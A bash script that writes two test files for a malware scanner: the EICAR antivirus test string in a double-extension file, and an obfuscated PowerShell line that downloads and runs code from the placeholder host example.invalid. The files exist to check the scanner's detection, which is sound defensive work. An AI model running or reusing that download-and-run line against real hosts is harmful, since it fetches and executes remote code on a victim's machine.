#!/usr/bin/env bash
# Creates harmless malware-scanner test files in a folder (default: ./tests/fixtures/scan).
#   * invoice.pdf.exe  - the industry-standard EICAR antivirus test string + a double extension  (expected: HIGH)
#   * update.ps1       - obfuscated download-and-run PowerShell text (never executed)           (expected: MEDIUM)
# Point "Scan folder" in the Malware Scan page at this folder.
set -e
DIR="${1:-$(dirname "$0")/fixtures/scan}"
mkdir -p "$DIR"
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$DIR/invoice.pdf.exe"
printf 'powershell -nop -w hidden -enc ZQBjAGgAbwA= ; IEX (New-Object Net.WebClient).DownloadString("http://example.invalid/x")' > "$DIR/update.ps1"
echo "fixtures written to $DIR"
